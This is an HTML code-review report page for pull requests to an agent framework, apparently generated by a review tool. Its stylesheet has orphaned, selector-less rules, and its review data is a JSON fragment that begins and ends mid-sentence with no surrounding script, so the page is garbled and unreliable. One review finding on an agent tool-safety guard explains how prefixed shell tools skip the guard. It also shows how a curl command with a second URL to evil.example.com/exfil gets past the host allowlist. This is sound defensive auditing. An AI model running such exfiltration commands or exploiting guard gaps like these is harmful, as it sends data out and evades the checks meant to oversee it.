<!doctype html>
<html lang="zh-CN">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>MyCR Review Report 2026-07-03</title>
<style>
:root {
  color-scheme: light;
  --bg: #f4f7fb;
  --panel: rgba(255, 255, 255, 0.94);
  --ink: #19202a;
  --muted: #667085;
  --line: #d8dee8;
  --accent: #116466;
  --accent-soft: #e8f7f4;
  --accent-2: #d17a22;
  --ok: #188038;
  --warn: #b45309;
  --bad: #b42318;
  --info: #1d4ed8;
  --soft: #f8fafc;
  --radius-lg: 24px;
  --radius-md: 16px;
  --radius-sm: 12px;
  --shadow: 0 18px 48px rgba(15, 23, 42, 0.08);
  --shadow-soft: 0 8px 24px rgba(15, 23, 42, 0.06);
  --shadow-lg: 0 22px 54px rgba(15, 23, 42, 0.12);
}
* { box-sizing: border-box; }
body {
  margin: 0;
  background:
    radial-gradient(circle at 12% 0%, rgba(17, 100, 102, 0.16), transparent 28rem),
    radial-gradient(circle at 88% 5%, rgba(29, 78, 216, 0.10), transparent 24rem),
    linear-gradient(180deg, #fbfcff 0%, var(--bg) 34rem);
  color: var(--ink);
  font-family: Inter, ui-sans-serif, system-ui, -apple-system, BlinkMacSystemFont,
    "Segoe UI", sans-serif;
  line-height: 1.5;
}
a { color: var(--accent); text-decoration-thickness: 1px; }
.shell { max-width: 1180px; margin: 0 auto; padding: 28px 18px 56px; }
.topbar {
  display: flex;
  align-items: flex-start;
  justify-content: space-between;
  gap: 18px;
  margin-bottom: 20px;
}
h1 {
  margin: 0 0 8px;
  font-size: clamp(34px, 5vw, 64px);
  line-height: 1.04;
  letter-spacing: -0.055em;
}
.subtitle { color: var(--muted); max-width: 760px; margin: 0; }
.toggle {
  display: inline-flex;
  border: 1px solid var(--line);
  background: var(--panel);
  border-radius: 999px;
  padding: 3px;
  box-shadow: var(--shadow);
  flex: none;
}
.toggle button {
  border: 0;
  background: transparent;
  color: var(--muted);
  border-radius: 999px;
  padding: 8px 13px;
  cursor: pointer;
  font-weight: 700;
}
.toggle button.active { background: var(--accent); color: white; }
.metrics {
  display: grid;
  grid-template-columns: repeat(5, minmax(0, 1fr));
  gap: 12px;
  margin: 18px 0;
}
.metric {
  background: var(--panel);
  border: 1px solid var(--line);
  border-radius: var(--radius-md);
  padding: 16px;
  box-shadow: var(--shadow-soft);
}
.metric .value { font-size: 32px; line-height: 1; font-weight: 800; }
.metric .label { color: var(--muted); margin-top: 7px; font-size: 13px; }
.dashboard {
  display: grid;
  grid-template-columns: 1.15fr 0.85fr;
  gap: 16px;
  align-items: start;
}
.panel {
  background: var(--panel);
  border: 1px solid var(--line);
  border-radius: var(--radius-md);
  box-shadow: var(--shadow);
  padding: 16px;
}
.panel h2 { margin: 0 0 12px; font-size: 18px; }
.bars { display: grid; gap: 12px; }
.bar-row {
  display: grid;
  grid-template-columns: 122px 1fr 36px;
  gap: 10px;
  align-items: center;
}
.bar-label { color: var(--muted); font-size: 13px; }
.bar-track {
  height: 12px;
  background: #eef2f7;
  border-radius: 999px;
  overflow: hidden;
}
.bar-fill { height: 100%; border-radius: 999px; background: var(--accent); }
.bar-fill.approved, .bar-fill.merged { background: var(--ok); }
.bar-fill.commented { background: var(--accent-2); }
.bar-fill.maintained { background: var(--accent); }
.bar-fill.skipped { background: var(--info); }
.bar-fill.blocked { background: var(--bad); }
.timeline { display: grid; gap: 10px; }
.timeline-item {
  display: grid;
  grid-template-columns: 96px 1fr;
  gap: 10px;
  padding: 10px 0;
  border-bottom: 1px solid #edf0f5;
}
.timeline-item:last-child { border-bottom: 0; }
.time { color: var(--muted); font-size: 13px; }
.controls {
  display: flex;
  flex-wrap: wrap;
  gap: 10px;
  align-items: center;
  margin: 18px 0 12px;
}
.search {
  flex: 1 1 280px;
  min-width: 0;
  border: 1px solid var(--line);
  border-radius: 8px;
  padding: 10px 12px;
  font: inherit;
  background: white;
}
.chips { display: flex; flex-wrap: wrap; gap: 8px; }
.chip {
  border: 1px solid var(--line);
  background: white;
  color: var(--ink);
  border-radius: 999px;
  padding: 8px 11px;
  cursor: pointer;
  font-weight: 700;
}
.chip.active { background: var(--ink); color: white; border-color: var(--ink); }
.cards { display: grid; gap: 12px; }
.section-heading {
  display: flex;
  align-items: baseline;
  justify-content: space-between;
  gap: 14px;
  margin: 22px 0 12px;
}
.section-heading h2 { margin: 0; font-size: 20px; }
.section-heading .hint { color: var(--muted); font-size: 13px; }
.card {
  min-width: 0;
  background: var(--panel);
  border: 1px solid var(--line);
  border-left: 5px solid var(--accent);
  border-radius: var(--radius-md);
  box-shadow: var(--shadow);
  overflow: hidden;
}
.card[data-status="approved"],
.card[data-status="merged"] { border-left-color: var(--ok); }
.card[data-status="commented"] { border-left-color: var(--accent-2); }
.card[data-status="maintained"] { border-left-color: var(--accent); }
.card[data-status="skipped"] { border-left-color: var(--info); }
.card[data-status="blocked"] { border-left-color: var(--bad); }
.card-head {
  display: grid;
  grid-template-columns: minmax(0, 1fr) auto;
  gap: 16px;
  padding: 18px;
  cursor: pointer;
}
.card-title { margin: 0; font-size: 17px; overflow-wrap: anywhere; }
.card-title a { overflow-wrap: anywhere; }
.meta {
  color: var(--muted);
  display: flex;
  flex-wrap: wrap;
  gap: 8px 12px;
  font-size: 13px;
  margin-top: 5px;
  min-width: 0;
}
.card-summary {
  color: #42526a;
  display: -webkit-box;
  font-size: 13px;
  line-height: 1.5;
  margin-top: 8px;
  overflow: hidden;
  overflow-wrap: anywhere;
  -webkit-box-orient: vertical;
  -webkit-line-clamp: 2;
}
.card-actions {
  align-items: flex-end;
  display: flex;
  flex-direction: column;
  gap: 8px;
}
.card-toggle {
  border: 1px solid #d8e1ec;
  background: #fff;
  border-radius: 999px;
  color: var(--muted);
  cursor: pointer;
  font: inherit;
  font-size: 12px;
  font-weight: 800;
  padding: 6px 10px;
  white-space: nowrap;
}
.card-toggle:hover { border-color: #9aa8bb; color: var(--ink); }
.badge {
  display: inline-flex;
  align-items: center;
  justify-content: center;
  min-width: 88px;
  border-radius: 999px;
  padding: 6px 10px;
  font-size: 12px;
  font-weight: 800;
  text-transform: uppercase;
  background: #eef2f7;
}
.badge.approved, .badge.merged { color: var(--ok); background: #e7f5ec; }
.badge.commented { color: var(--warn); background: #fff4e5; }
.badge.maintained { color: var(--accent); background: #e6fffb; }
.badge.skipped { color: var(--info); background: #eaf1ff; }
.badge.blocked { color: var(--bad); background: #fff0ee; }
.read-pill {
  display: inline-flex;
  align-items: center;
  gap: 6px;
  border: 1px solid transparent;
  border-radius: 999px;
  padding: 6px 10px;
  font-size: 12px;
  font-weight: 900;
  white-space: nowrap;
}
.read-pill.critical {
  color: #9f1239;
  background: #fff1f2;
  border-color: #fecdd3;
}
.read-pill.focus {
  color: #92400e;
  background: #fffbeb;
  border-color: #fde68a;
}
.read-pill.skim {
  color: #166534;
  background: #ecfdf3;
  border-color: #bbf7d0;
}
.read-pill.follow {
  color: #1d4ed8;
  background: #eff6ff;
  border-color: #bfdbfe;
}
.headline-row {
  display: flex;
  align-items: center;
  justify-content: space-between;
  gap: 12px;
}
.advice-reason {
  color: var(--muted);
  font-size: 12px;
  font-style: italic;
}
.reading-guide {
  margin-top: 16px;
}
.guide-head {
  display: flex;
  align-items: baseline;
  justify-content: space-between;
  gap: 14px;
  margin-bottom: 12px;
}
.guide-head h2 { margin: 0; }
.guide-head span {
  color: var(--muted);
  font-size: 13px;
}
.guide-grid {
  display: grid;
  grid-template-columns: repeat(3, minmax(0, 1fr));
  gap: 10px;
}
.guide-card {
  display: grid;
  gap: 8px;
  min-width: 0;
  border: 1px solid #e5edf5;
  border-left: 4px solid var(--accent);
  border-radius: var(--radius-sm);
  padding: 12px;
  background: linear-gradient(180deg, #fff, #fbfcfe);
}
.guide-card.critical { border-left-color: #e11d48; }
.guide-card.focus { border-left-color: #d97706; }
.guide-card.skim { border-left-color: #16a34a; }
.guide-card.follow { border-left-color: #2563eb; }
.guide-card a {
  color: var(--ink);
  font-weight: 900;
  text-decoration: none;
}
.guide-card a:hover { color: var(--accent); }
.guide-meta {
  display: flex;
  flex-wrap: wrap;
  gap: 8px;
  align-items: center;
}
.guide-reason {
  color: var(--muted);
  font-size: 12px;
  line-height: 1.45;
}
.card-body {
  display: none;
  border-top: 1px solid #edf0f5;
  padding: 0 18px 18px;
}
.card.open .card-body { display: block; }
.grid {
  display: grid;
  grid-template-columns: repeat(2, minmax(0, 1fr));
  gap: 12px;
  margin-top: 14px;
}
.field {
  border: 1px solid #edf0f5;
  background: #fbfcfe;
  border-radius: var(--radius-sm);
  padding: 12px;
}
.field strong {
  display: block;
  color: var(--muted);
  font-size: 12px;
  margin-bottom: 5px;
}
.field-body {
  overflow-wrap: anywhere;
  white-space: pre-wrap;
}
.overview-content {
  overflow-wrap: anywhere;
  white-space: pre-wrap;
  color: var(--ink);
}
.comment {
  border-left: 3px solid var(--accent-2);
  padding: 10px 12px;
  background: #fffaf2;
  border-radius: var(--radius-sm);
  margin-top: 10px;
  overflow-wrap: anywhere;
  white-space: pre-wrap;
}
.comment-head {
  display: flex;
  align-items: baseline;
  justify-content: space-between;
  gap: 12px;
  margin-bottom: 6px;
}
.comment-link {
  color: var(--muted);
  font-size: 12px;
  font-weight: 800;
  white-space: nowrap;
}
.pr-readout {
  display: grid;
  grid-template-columns: minmax(0, 1fr);
  gap: 18px;
  align-items: start;
  padding-top: 18px;
}
.pr-story {
  display: grid;
  gap: 16px;
  min-width: 0;
}
.story-block {
  border-top: 1px solid #e7edf4;
  padding-top: 14px;
}
.story-block:first-child {
  border-top: 0;
  padding-top: 0;
}
.story-block.hero-block {
  border: 1px solid #dce9e7;
  border-left: 4px solid var(--accent);
  border-radius: var(--radius-md);
  padding: 15px 16px;
  background: linear-gradient(180deg, #fbfffe, #f8fbfd);
}
.story-block h4,
.review-rail h4,
.comments-panel h4 {
  margin: 0 0 9px;
  color: #17202a;
  font-size: 14px;
  letter-spacing: 0;
}
.story-line {
  display: grid;
  grid-template-columns: 108px minmax(0, 1fr);
  gap: 12px;
  margin: 0;
  padding: 9px 0;
  border-top: 1px solid #edf2f7;
  color: #1f2937;
  line-height: 1.68;
}
.story-line:first-of-type {
  border-top: 0;
  padding-top: 0;
}
.story-label {
  color: #536175;
  font-size: 12px;
  font-weight: 850;
}
.story-text {
  min-width: 0;
  overflow-wrap: anywhere;
  white-space: pre-wrap;
}
.review-rail {
  position: static;
  display: grid;
  gap: 14px;
  align-self: start;
}
.reading-callout {
  display: grid;
  gap: 6px;
  border: 1px solid #e5edf5;
  border-left: 4px solid var(--accent);
  border-radius: var(--radius-sm);
  padding: 12px;
  background: #fff;
}
.reading-callout.critical {
  border-left-color: #e11d48;
  background: linear-gradient(180deg, #fff7f8, #fff);
}
.reading-callout.focus {
  border-left-color: #d97706;
  background: linear-gradient(180deg, #fffbeb, #fff);
}
.reading-callout.skim {
  border-left-color: #16a34a;
  background: linear-gradient(180deg, #f0fdf4, #fff);
}
.reading-callout.follow {
  border-left-color: #2563eb;
  background: linear-gradient(180deg, #eff6ff, #fff);
}
.reading-callout strong {
  font-size: 13px;
}
.reading-callout span {
  color: var(--muted);
  font-size: 12px;
  font-style: italic;
  line-height: 1.5;
}
.story-text mark,
.fact dd mark,
.field-body mark,
.card-summary mark,
.overview-content mark,
.comment mark,
.skip-detail mark {
  border-radius: 5px;
  padding: 0 4px;
  font-weight: 850;
}
.mark-good {
  color: #166534;
  background: #dcfce7;
}
.mark-warn {
  color: #92400e;
  background: #fef3c7;
}
.mark-bad {
  color: #9f1239;
  background: #ffe4e6;
}
.mark-info {
  color: #1d4ed8;
  background: #dbeafe;
}
.fact-list {
  display: grid;
  gap: 10px;
  margin: 0;
  padding: 0;
}
.fact {
  border-top: 1px solid #e7edf4;
  padding-top: 10px;
}
.fact:first-child {
  border-top: 0;
  padding-top: 0;
}
.fact dt {
  margin: 0 0 4px;
  color: #536175;
  font-size: 11px;
  font-weight: 850;
  letter-spacing: 0;
  text-transform: uppercase;
}
.fact dd {
  margin: 0;
  color: #1f2937;
  line-height: 1.55;
  overflow-wrap: anywhere;
  white-space: pre-wrap;
}
.comments-panel {
  border-top: 1px solid #e7edf4;
  padding-top: 14px;
}
.comment-list {
  display: grid;
  gap: 10px;
}
.skip-groups { display: grid; gap: 14px; margin-top: 12px; }
.skip-group {
  background: var(--panel);
  border: 1px solid var(--line);
  border-radius: var(--radius-md);
  box-shadow: var(--shadow);
  overflow: hidden;
}
.skip-group-head {
  display: grid;
  grid-template-columns: 1fr auto;
  gap: 14px;
  padding: 15px 16px;
  cursor: pointer;
  background: #fbfcfe;
}
.skip-group-title { margin: 0; font-size: 16px; }
.skip-group-count {
  color: var(--info);
  background: #eaf1ff;
  border-radius: 999px;
  padding: 5px 10px;
  font-weight: 800;
  font-size: 12px;
}
.skip-group-body { display: none; border-top: 1px solid #edf0f5; }
.skip-group.open .skip-group-body { display: block; }
.skip-row {
  display: grid;
  grid-template-columns: minmax(0, 1fr) minmax(170px, 0.7fr);
  gap: 12px;
  padding: 13px 16px;
  border-bottom: 1px solid #edf0f5;
}
.skip-row:last-child { border-bottom: 0; }
.skip-title { font-weight: 750; }
.skip-detail { color: var(--muted); font-size: 13px; margin-top: 4px; }
.blocker-list {
  display: grid;
  gap: 8px;
  margin: 8px 0 0;
  padding: 0;
  list-style: none;
}
.blocker-item {
  border: 1px solid #e5edf5;
  border-left: 3px solid var(--warn);
  border-radius: var(--radius-sm);
  padding: 9px 10px;
  background: #fff;
}
.blocker-item a {
  color: var(--accent);
  font-weight: 800;
}
.blocker-meta {
  color: var(--muted);
  font-size: 12px;
  line-height: 1.45;
  margin-top: 4px;
}
.empty {
  border: 1px dashed var(--line);
  border-radius: 8px;
  padding: 22px;
  color: var(--muted);
  text-align: center;
  background: rgba(255, 255, 255, 0.68);
}
.footer {
  color: var(--muted);
  font-size: 12px;
  margin-top: 22px;
}
body {
  font-size: 14px;
}
a:hover { color: #0a5d57; }
.shell { max-width: 1280px; padding: 24px 20px 64px; }
.topbar {
  align-items: center;
  background:
    linear-gradient(135deg, var(--accent-soft), rgba(37, 99, 235, 0.04)),
    var(--panel);
  border: 1px solid var(--line);
  border-radius: var(--radius-lg);
  padding: 22px 24px;
  box-shadow: var(--shadow-lg);
}
.subtitle { max-width: 860px; font-size: 14px; }
.toggle { box-shadow: none; }
.toggle button { padding: 7px 12px; }
.metrics {
  grid-template-columns: repeat(5, minmax(140px, 1fr));
  gap: 10px;
  margin: 16px 0;
}
.metric {
  position: relative;
  overflow: hidden;
  padding: 14px 16px;
}
.metric::before {
  content: "";
  position: absolute;
  inset: 0 auto 0 0;
  width: 4px;
  background: var(--accent);
}

.metric .label {
  margin-top: 6px;
  font-size: 12px;
  font-weight: 700;
  text-transform: uppercase;
}
.dashboard {
  grid-template-columns: minmax(0, 0.9fr) minmax(0, 1.1fr);
}
.panel {
  box-shadow: var(--shadow);
  padding: 18px;
}
.panel h2 {
  font-size: 15px;
  letter-spacing: 0;
}
.bar-row {
  grid-template-columns: 112px 1fr 32px;
  padding: 4px 0;
}
.bar-label { font-weight: 700; }

  grid-template-columns: 74px 1fr;
  padding: 9px 0;
}

}

}

  border-radius: 8px;
  padding: 10px;
  margin: 18px 0 14px;
  box-shadow: var(--shadow);
}
.search {
  min-height: 40px;
  border-color: #cfd8e3;
  box-shadow: inset 0 1px 0 rgba(15, 23, 42, 0.02);
}
.search:focus {
  outline: 2px solid rgba(15, 118, 110, 0.22);
  border-color: var(--accent);
}
.chips { align-items: center; }
.chip, .utility-button {
  min-height: 34px;
  border: 1px solid #cfd8e3;
  background: #fff;
  border-radius: 999px;
  color: var(--ink);
  cursor: pointer;
  font: inherit;
  font-weight: 750;
  padding: 7px 11px;
}

  background: #15202b;
  border-color: #15202b;
  color: #fff;
}
.utilities {
  display: flex;
  flex-wrap: wrap;
  gap: 8px;
  margin-left: auto;
}
.utility-button {
  color: var(--muted);
  font-size: 12px;
}
.section-heading {
  margin: 24px 0 12px;
  padding-top: 2px;
}
.section-heading h2 { font-size: 18px; }
.cards { gap: 14px; }
.card {
  border-left: 0;
  box-shadow: var(--shadow);
  transition: box-shadow 160ms ease, transform 160ms ease, border-color 160ms ease;
}
.card:hover {
  border-color: #c8d2df;
  box-shadow: var(--shadow-lg);
}
.card-head {
  align-items: center;
  background: linear-gradient(180deg, #fff, #fbfcfe);
  border-left: 4px solid var(--accent);
}
.card[data-status="approved"] .card-head,
.card[data-status="merged"] .card-head { border-left-color: var(--ok); }

.card[data-status="blocked"] .card-head { border-left-color: var(--bad); }
.card.priority-critical .card-head {
  background: linear-gradient(180deg, #fff7f8, #fff);
}
.card.priority-focus .card-head {
  background: linear-gradient(180deg, #fffbeb, #fff);
}
.card.priority-follow .card-head {
  background: linear-gradient(180deg, #eff6ff, #fff);
}
.card-title {
  font-size: 16px;
  line-height: 1.42;
}
.meta {
  display: flex;
  align-items: center;
  flex-wrap: wrap;
  gap: 8px;
  margin-top: 7px;
}
.badge {
  gap: 7px;
  min-width: 0;
  padding: 6px 11px;
  text-transform: none;
  white-space: nowrap;
}
.card-summary {
  color: #526173;
  margin-top: 9px;
}
.badge::before {
  content: "";
  width: 8px;
  height: 8px;
  border-radius: 50%;
  background: currentColor;
}
.card-body {
  background: #fff;
  padding: 0 18px 18px;
}
.grid {
  grid-template-columns: 1fr;
  gap: 10px;
}
.field {
  background: #fbfcfe;
  border-color: #e6ecf3;
  padding: 13px 14px;
}
.field strong {
  color: #536175;
  font-size: 11px;
  letter-spacing: 0;
  text-transform: uppercase;
}
.field-body {
  color: #1f2937;
  line-height: 1.62;
}
.comment {
  background: #fff8ed;
  border-left-color: var(--accent-2);
  color: #1f2937;
}
.comment-head {
  color: #1f2937;
}
.pr-readout {
  grid-template-columns: minmax(0, 1fr);
  gap: 18px;
}
.story-block {
  border-top-color: #e2e8f0;
}
.story-block.hero-block {
  background: linear-gradient(180deg, #fbfffe, #f7fbfa);
  border-color: #d5e7e4;
  box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.72);
}
.story-block h4,
.review-rail h4,
.comments-panel h4 {
  font-size: 13px;
  font-weight: 900;
}
.story-line {
  grid-template-columns: 116px minmax(0, 1fr);
  border-top-color: #e9eef5;
}
.story-label {
  color: #607086;
}
.review-rail {
  border: 1px solid #e3eaf2;
  border-radius: 8px;
  padding: 14px;
  background: #fbfcfe;
}
.review-rail .fact-list {
  grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
}
.fact {
  border-top-color: #e8eef5;
}
.comments-panel {
  border-top-color: #e2e8f0;
}
.comment-list {
  gap: 12px;
}
.skip-group {
  box-shadow: var(--shadow);
}
.skip-group-head {
  align-items: center;
  background: linear-gradient(180deg, #fff, #fbfcfe);
}
.skip-row {
  grid-template-columns: minmax(0, 1.15fr) minmax(220px, 0.85fr);
}
.blocker-item {
  box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.75);
}
.empty {
  background: #fff;
  box-shadow: var(--shadow);
}
@media (max-width: 840px) {
  .topbar, .card-head { grid-template-columns: 1fr; display: grid; }
  .card-actions { align-items: flex-start; flex-direction: row; flex-wrap: wrap; }
  .dashboard, .grid, .metrics { grid-template-columns: 1fr; }
  .guide-grid { grid-template-columns: 1fr; }
  .headline-row { align-items: flex-start; flex-direction: column; }
  .pr-readout { grid-template-columns: 1fr; }
  .review-rail { position: static; }
  .story-line { grid-template-columns: 1fr; gap: 4px; }
  .timeline-item { grid-template-columns: 1fr; }
  .controls { position: static; }
  .utilities { width: 100%; margin-left: 0; }
  .utility-button { flex: 1 1 auto; }
  .skip-row { grid-template-columns: 1fr; }
}
</style>
</head>
<body>
<div class="shell">
  <div class="topbar">
    <div>
      <h1 data-i18n="title">MyCR 审核报告</h1>
      <p class="subtitle" id="subtitle"></p>
    </div>
    <div class="toggle" aria-label="Language">
      <button type="button" data-lang-button="zh" class="active">中文</button>
      <button type="button" data-lang-button="en">EN</button>
    </div>
  </div>
  <section class="metrics" id="metrics"></section>
  <section class="dashboard">
    <div class="panel">
      <h2 data-i18n="statusDistribution">状态分布</h2>
      <div class="bars" id="bars"></div>
    </div>
    <div class="panel">
      <h2 data-i18n="timeline">执行时间线</h2>
      <div class="timeline" id="timeline"></div>
    </div>
  </section>
  <section class="panel" id="overviewPanel" style="display: none; margin-top: 16px;">
    <h2 data-i18n="overviewSection">整体摘要</h2>
    <div class="overview-content" id="overviewContent"></div>
  </section>
  <section class="panel reading-guide" id="readingGuidePanel" style="display: none;">
    <div class="guide-head">
      <h2 data-i18n="readingGuide">阅读建议</h2>
      <span data-i18n="readingGuideHint">先看高风险和高影响 PR</span>
    </div>
    <div class="guide-grid" id="readingGuide"></div>
  </section>
  <section class="controls">
    <input class="search" id="search" type="search">
    <div class="chips" id="chips"></div>
    <div class="utilities">
      <button type="button" class="utility-button" id="openAll"></button>
      <button type="button" class="utility-button" id="closeAll"></button>
    </div>
  </section>
  <section class="section-heading">
    <h2 data-i18n="reviewedSection">已处理 PR</h2>
    <div class="hint" data-i18n="reviewedHint">点击卡片查看细节</div>
  </section>
  <main class="cards" id="cards"></main>
  <section class="section-heading" id="skippedHeading">
    <h2 data-i18n="skippedGroups">未审核 PR 分类</h2>
    <div class="hint" data-i18n="skippedHint">按排除原因分组</div>
  </section>
  <section class="skip-groups" id="skipGroups"></section>
  <section class="section-heading" id="followUpHeading">
    <h2 data-i18n="followUpSection">后续关注</h2>
    <div class="hint" data-i18n="followUpHint">接近可处理但仍有阻塞</div>
  </section>
  <section class="cards" id="followUpCards"></section>
  <div class="footer" id="footer"></div>
</div>

e when the branch-triggered dispatch selected only the full-session target, for example an empty branch allowlist with cascade enabled. `contextForSummaryTarget` still sets the trigger key and the cache-safe fork request is present, so the only selected full-session summary returns false here and no summary is generated. Please only skip the full-session target when it is the cascaded second target after a branch summary, or clear the cache-safe fork request for full-session-only dispatch.\n\n<details><summary>中文<\/summary>\n这里不只会跳过“分支摘要之后级联的全量摘要”，也会误伤只选择了 full-session target 的分支触发场景。比如分支 allowlist 为空但开启 cascade 时，context 里仍有 trigger key 和 cache-safe fork request，唯一的 full-session 摘要会在这里直接返回 false，导致完全不生成摘要。建议只在“分支摘要之后的第二个级联 full-session target”上跳过，或者对 full-session-only 调用清掉 cache-safe fork request。\n<\/details>","line":null,"path":"session/internal/summary/summary.go","summary":"This skip can also fire when the branch-triggered dispatch selected only the full-session target, for example an empty branch allowlist with cascade enabled. `contextForSummaryTarget` still sets the trigger key and the cache-safe fork request is present, so the only selected full-session summary returns false here and no summary is generated. Please only skip the full-session target when it is the cascaded second target after a branch summary, or clear the cache-safe fork request for full-session-only dispatch.","url":"https://github.com/trpc-group/trpc-agent-go/pull/2064#discussion_r3517126298"}],"number":2064,"outcome":"Posted 1 blocking inline comment(s) and submitted request changes.","problem":"The cache-safe fork skip path is scoped too broadly and can suppress the only selected full-session summary target.","problem_framing":"The cache-safe fork skip path is scoped too broadly and can suppress the only selected full-session summary target.","review_body":"Thanks for the update. I found one remaining blocker in the cache-safe fork skip path.","review_url":"https://github.com/trpc-group/trpc-agent-go/pull/2064#pullrequestreview-4622360638","risk":"Users configured for full-session summaries only can stop receiving automatic summaries under cache-safe forking.","root_cause":"The cache-safe fork skip path is scoped too broadly and can suppress the only selected full-session summary target.","status":"commented","technical_background":"cache-safe fork summary dispatch must not suppress full-session-only summaries","tests_docs":"验证方式：GitHub effective checks/head 状态 + 本地 diff/source inspection；仅 #2062 合入前额外跑了本地目标包测试。","title":"runner: pass cache-safe fork request to summaries","url":"https://github.com/trpc-group/trpc-agent-go/pull/2064"},{"approach":"Verified `CaseSummaryWithFilterKey` events and memory step execution paths, then posted two blockers.","attention_points":"Submitted REQUEST_CHANGES review; review URL: https://github.com/trpc-group/trpc-agent-go/pull/2051#pullrequestreview-4622362381","author":"xiaosansh","ci_state":"checks: pass:166, pending:0, fail:0; merge:BLOCKED; review:CHANGES_REQUESTED","design_assessment":"Verified `CaseSummaryWithFilterKey` events and memory step execution paths, then posted two blockers.","head_sha":"63b9ec36e6c9ad00f53b46b53a57413f10256026","inline_comments":[{"body":"This case now creates a `FilterKey: \"branch\"` summary, but the events it summarizes still have empty `Event.FilterKey`. A backend can drop keyed event metadata and still pass this built-in case, so the previous filter-key coverage gap is only partially closed. Please set these c14 events to the same filter key and assert the keyed summary/session boundary reflects those keyed events.\n\n<details><summary>中文<\/summary>\n这个 case 现在创建了 `FilterKey: \"branch\"` 的 summary，但参与摘要的事件本身仍然没有设置 `Event.FilterKey`。这样后端即使丢掉 keyed event 元数据，内置 case 仍可能通过，之前的 filter-key 覆盖缺口只修了一半。建议把这组 c14 event 也设成同一个 filter key，并断言 keyed summary/session boundary 真的覆盖这些 keyed events。\n<\/details>","line":null,"path":"session/replaytest/cases.go","summary":"This case now creates a `FilterKey: \"branch\"` summary, but the events it summarizes still have empty `Event.FilterKey`. A backend can drop keyed event metadata and still pass this built-in case, so the previous filter-key coverage gap is only partially closed. Please set these c14 events to the same filter key and assert the keyed summary/session boundary reflects those keyed events.","url":"https://github.com/trpc-group/trpc-agent-go/pull/2051#discussion_r3517127689"},{"body":"Memory steps still silently no-op when `MemoryService` is nil. That means a custom or future replay case can forget `RequiredCaps.NeedsMemory` and still report success without running `AddMemoryStep` / `SearchMemoryStep`, the same false-pass class this PR fixed for track steps. Please return an execution error here (and in search) or derive/validate required capabilities from the step list before execution.\n\n<details><summary>中文<\/summary>\n`MemoryService == nil` 时 memory step 仍然直接 no-op。这样自定义或未来新增的 replay case 如果漏填 `RequiredCaps.NeedsMemory`，`AddMemoryStep` / `SearchMemoryStep` 实际没有运行也会报告成功，和本 PR 已经修掉的 track step 假通过属于同一类问题。建议这里和 search memory 分支都返回执行错误，或者在执行前从 step 列表自动推导/校验 required capabilities。\n<\/details>","line":null,"path":"session/replaytest/harness.go","summary":"Memory steps still silently no-op when `MemoryService` is nil. That means a custom or future replay case can forget `RequiredCaps.NeedsMemory` and still report success without running `AddMemoryStep` / `SearchMemoryStep`, the same false-pass class this PR fixed for track steps. Please return an execution error here (and in search) or derive/validate required capabilities from the step list before execution.","url":"https://github.com/trpc-group/trpc-agent-go/pull/2051#discussion_r3517127691"}],"number":2051,"outcome":"Posted 2 blocking inline comment(s) and submitted request changes.","problem":"FilterKey event coverage and missing memory-service handling still allow false-pass replay cases.","problem_framing":"FilterKey event coverage and missing memory-service handling still allow false-pass replay cases.","review_body":"Thanks for the revision. Two false-pass paths remain in the replay harness.","review_url":"https://github.com/trpc-group/trpc-agent-go/pull/2051#pullrequestreview-4622362381","risk":"Backends can pass replay while losing keyed event metadata or skipping memory writes/searches entirely.","root_cause":"FilterKey event coverage and missing memory-service handling still allow false-pass replay cases.","status":"commented","technical_background":"session/replaytest must catch backend consistency loss rather than silently passing missing capability or keyed-summary cases","tests_docs":"验证方式：GitHub effective checks/head 状态 + 本地 diff/source inspection；仅 #2062 合入前额外跑了本地目标包测试。","title":"session/replaytest: add multi-backend replay consistency test framework","url":"https://github.com/trpc-group/trpc-agent-go/pull/2051"},{"approach":"Verified `NewNamedToolSet` prefixes hostexec tools and inspected network/path scanner logic, then posted three blockers.","attention_points":"Submitted REQUEST_CHANGES review; review URL: https://github.com/trpc-group/trpc-agent-go/pull/2050#pullrequestreview-4622363279","author":"d2bz","ci_state":"checks: pass:162, pending:0, fail:0; merge:BLOCKED; review:CHANGES_REQUESTED","design_assessment":"Verified `NewNamedToolSet` prefixes hostexec tools and inspected network/path scanner logic, then posted three blockers.","head_sha":"a4f424f7621969e1aa736c3df5a567940a5ea3b1","inline_comments":[{"body":"The default mapping only recognizes raw `exec_command`, but tools coming from a normal `hostexec.NewToolSet` are wrapped by `NewNamedToolSet` and exposed as `hostexec_exec_command`. Those calls become `BackendUnknown` and return allow without scanning/audit, so the documented hostexec path can bypass the guard. Please include the prefixed hostexec names or derive the backend from the resolved semantic tool/toolset, and add a regression using `hostexec.NewToolSet` through `WithToolSets`.\n\n<details><summary>中文<\/summary>\n这里默认只识别裸的 `exec_command`，但正常通过 `hostexec.NewToolSet` 注册时会被 `NewNamedToolSet` 包成 `hostexec_exec_command`。这些调用会落到 `BackendUnknown` 并直接 allow，不会进入扫描或审计，导致文档里的 hostexec 路径绕过 guard。建议补上 prefixed hostexec 名称，或者从 resolved semantic tool/toolset 推导 backend，并加一个 `hostexec.NewToolSet` + `WithToolSets` 的回归测试。\n<\/details>","line":null,"path":"tool/safety/permission.go","summary":"The default mapping only recognizes raw `exec_command`, but tools coming from a normal `hostexec.NewToolSet` are wrapped by `NewNamedToolSet` and exposed as `hostexec_exec_command`. Those calls become `BackendUnknown` and return allow without scanning/audit, so the documented hostexec path can bypass the guard. Please include the prefixed hostexec names or derive the backend from the resolved semantic tool/toolset, and add a regression using `hostexec.NewToolSet` through `WithToolSets`.","url":"https://github.com/trpc-group/trpc-agent-go/pull/2050#discussion_r3517128454"},{"body":"The network rule extracts only the first target host, then allows the entire command when that host is allowlisted. `curl https://github.com/ok https://evil.example.com/exfil` therefore passes because only `github.com` is evaluated. Please extract and evaluate all network targets, denying/asking if any target is non-allowlisted or unknown.\n\n<details><summary>中文<\/summary>\n网络规则这里只取第一个目标 host，只要它在 allowlist 里就允许整条命令。比如 `curl https://github.com/ok https://evil.example.com/exfil` 只会检查 `github.com`，第二个非白名单目标会被放过。建议提取并检查所有网络目标，只要有任意目标不在白名单或无法确定，就 deny/ask。\n<\/details>","line":null,"path":"tool/safety/rules.go","summary":"The network rule extracts only the first target host, then allows the entire command when that host is allowlisted. `curl https://github.com/ok https://evil.example.com/exfil` therefore passes because only `github.com` is evaluated. Please extract and evaluate all network targets, denying/asking if any target is non-allowlisted or 